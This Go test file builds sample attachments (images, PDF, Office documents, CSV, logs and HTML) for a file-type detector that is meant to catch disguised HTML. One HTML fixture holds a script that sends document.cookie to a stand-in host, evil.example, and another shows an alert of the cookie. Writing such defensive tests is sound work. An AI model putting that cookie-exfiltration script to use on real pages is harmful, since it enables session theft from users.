package attachment_test

import (
	"archive/zip"
	"bytes"
	"image"
	"image/color"
	"image/jpeg"
	"image/png"
	"math/rand"
	"testing"

	"golang.org/x/image/bmp"
)

// Real files, built here rather than checked in or hand-written as magic bytes.
//
// A fixture that is only the first eight bytes of a format proves the detector
// reads the first eight bytes. These are files the corresponding decoder would
// actually open, so a detector that looks deeper — at the ZIP directory of an
// OOXML package, say — is exercised rather than fooled, and so is one that
// looks at nothing but a prefix. Generated so the test carries no binary
// blobs and stays readable.

// noisyImage returns an image of random pixels.
//
// Noise, not a flat fill: a uniform image compresses to almost nothing in both
// PNG and JPEG, which makes "did recompression change the bytes" unanswerable.
// Noise gives PNG nothing to work with and JPEG something to throw away, so
// the two encodings differ by a wide margin.
func noisyImage(w, h int, seed int64) image.Image {
	r := rand.New(rand.NewSource(seed))
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := range h {
		for x := range w {
			img.Set(x, y, color.RGBA{
				R: uint8(r.Intn(256)),
				G: uint8(r.Intn(256)),
				B: uint8(r.Intn(256)),
				A: 255,
			})
		}
	}
	return img
}

func pngFixture(t *testing.T) []byte {
	t.Helper()
	var b bytes.Buffer
	if err := png.Encode(&b, noisyImage(64, 64, 1)); err != nil {
		t.Fatalf("building the PNG fixture: %v", err)
	}
	return b.Bytes()
}

func jpegFixture(t *testing.T) []byte {
	t.Helper()
	var b bytes.Buffer
	if err := jpeg.Encode(&b, noisyImage(64, 64, 2), nil); err != nil {
		t.Fatalf("building the JPEG fixture: %v", err)
	}
	return b.Bytes()
}

func bmpFixture(t *testing.T) []byte {
	t.Helper()
	var b bytes.Buffer
	if err := bmp.Encode(&b, noisyImage(32, 32, 3)); err != nil {
		t.Fatalf("building the BMP fixture: %v", err)
	}
	return b.Bytes()
}

// pdfFixture is a PDF with a catalogue, a page tree and one page — the
// smallest thing a reader will open, rather than the four bytes "%PDF".
func pdfFixture() []byte {
	return []byte("%PDF-1.4\n" +
		"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n" +
		"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n" +
		"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj\n" +
		"trailer<</Root 1 0 R>>\n%%EOF\n")
}

// ooxml builds an Office Open XML package: a ZIP whose entries are in the
// order a real one uses, because that ordering is how a container is told
// apart from a plain archive.
func ooxml(t *testing.T, entries [][2]string) []byte {
	t.Helper()
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	for _, e := range entries {
		w, err := zw.Create(e[0])
		if err != nil {
			t.Fatalf("building the OOXML fixture: %v", err)
		}
		if _, err := w.Write([]byte(e[1])); err != nil {
			t.Fatalf("building the OOXML fixture: %v", err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("building the OOXML fixture: %v", err)
	}
	return b.Bytes()
}

func docxFixture(t *testing.T) []byte {
	t.Helper()
	return ooxml(t, [][2]string{
		{"[Content_Types].xml", `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`},
		{"_rels/.rels", `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>`},
		{"word/document.xml", `<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>hello</w:t></w:r></w:p></w:body></w:document>`},
	})
}

func xlsxFixture(t *testing.T) []byte {
	t.Helper()
	return ooxml(t, [][2]string{
		{"[Content_Types].xml", `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>`},
		{"_rels/.rels", `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>`},
		{"xl/workbook.xml", `<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="Sheet1" sheetId="1"/></sheets></workbook>`},
		{"xl/worksheets/sheet1.xml", `<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData/></worksheet>`},
	})
}

// htmlFixture is the file the whole control exists for: the thing a browser
// executes, arriving under a name that says it is something harmless.
func htmlFixture() []byte {
	return []byte("<!DOCTYPE html>\n<html><head><title>Invoice</title></head>" +
		"<body><script>fetch('//evil.example/'+document.cookie)</script></body></html>\n")
}

// htmlNoDoctypeFixture is the same content without the declaration, which is
// what a real page scraped out of a support ticket usually looks like. A
// detector that only matches "<!DOCTYPE html" would pass the case above and
// miss this one.
func htmlNoDoctypeFixture() []byte {
	return []byte("<html><script>alert(document.cookie)</script></html>")
}

func svgFixture() []byte {
	return []byte(`<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10"/></svg>`)
}

func csvFixture() []byte {
	return []byte("id,name,email\n1,Ada,ada@example.com\n2,Alan,alan@example.com\n")
}

// logFixture is ordinary log text: no signature of any kind, which is exactly
// why .txt, .log, .csv and .md cannot be told apart by content.
func logFixture() []byte {
	return []byte("2026-09-23 12:00:01 INFO  printer queue drained\n" +
		"2026-09-23 12:00:02 WARN  toner low\n")
}

// unrecognisableFixture is bytes no format claims. Deterministic, so a failure
// is reproducible.
func unrecognisableFixture() []byte {
	b := make([]byte, 512)
	rand.New(rand.NewSource(9)).Read(b)
	return b
}
